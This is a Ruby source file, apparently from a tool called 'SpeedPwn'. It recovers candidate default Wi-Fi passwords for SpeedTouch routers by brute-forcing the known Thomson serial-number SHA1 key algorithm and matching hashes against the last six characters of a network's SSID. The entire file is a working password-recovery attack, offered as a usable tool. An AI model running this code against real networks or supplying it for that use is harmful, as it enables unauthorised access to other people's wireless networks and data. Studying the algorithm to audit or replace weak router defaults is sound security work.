module SpeedPwn
  ##
  # The Generator class takes a SpeedTouch SSID part (the last 6 characters)
  # and returns an Array containing the possible default passwords for it. This
  # code is based on the following resources:
  #
  # * http://www.gnucitizen.org/blog/default-key-algorithm-in-thomson-and-bt-home-hub-routers/
  # * http://www.mentalpitstop.com/touchspeedcalc/calculate_speedtouch_default_wep_wpa_wpa2_password_by_ssid.html
  #
  # Note that unlike other tools this particular one *only* supports SpeedTouch
  # routers since BT Home hubs are not used in The Netherlands.
  #
  # @!attribute [r] identifier
  #  @return [String]
  #
  class Generator
    attr_reader :identifier

    ##
    # @return [Array]
    #
    YEARS = ('04'..(Time.now.strftime('%y'))).to_a

    ##
    # @return [Array]
    #
    WEEKS = ('1'..'52').to_a

    ##
    # @return [Array]
    #
    CHARACTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.chars.to_a

    ##
    # @param [String] identifier The last 6 characters of the SSID.
    #
    def initialize(identifier)
      @identifier = identifier
      @digest     = OpenSSL::Digest::SHA1.new
    end

    ##
    # Sets the block to call whenever a week (= batch) has been processed.
    #
    # @param [Proc] block
    #
    def finish_batch(&block)
      @finish_batch = block
    end

    ##
    # Generates the passwords and returns them as an Array of Strings.
    #
    # @return [Array]
    #
    def generate
      passwords  = []
      batch_size = character_combinations.size

      YEARS.each do |year|
        WEEKS.each do |week|
          character_combinations.each do |combo|
            found = generate_password(year, week, combo)

            passwords << found if found
          end

          @finish_batch.call(batch_size) if @finish_batch
        end
      end

      return passwords
    end

    ##
    # Returns the amount of iterations to run.
    #
    # @return [Numeric]
    #
    def size
      return YEARS.size * WEEKS.size * character_combinations.size
    end

    alias_method :count, :size

    private

    ##
    # @param [String] year
    # @param [String] week
    # @param [String] combo
    # @return [String]
    #
    def generate_password(year, week, combo)
      found  = nil
      serial = "CP#{year}#{week}#{combo}".upcase
      hash   = @digest.hexdigest(serial).upcase

      if hash[-6..-1] == identifier
        found = hash[0..9]
      end

      return found
    end

    ##
    # @return [Array]
    #
    def character_combinations
      @combinations ||= CHARACTERS.permutation(3).map do |group|
        group.map { |char| char.ord.to_s(16) }.join('')
      end

      return @combinations
    end
  end # Generator
end # SpeedPwn
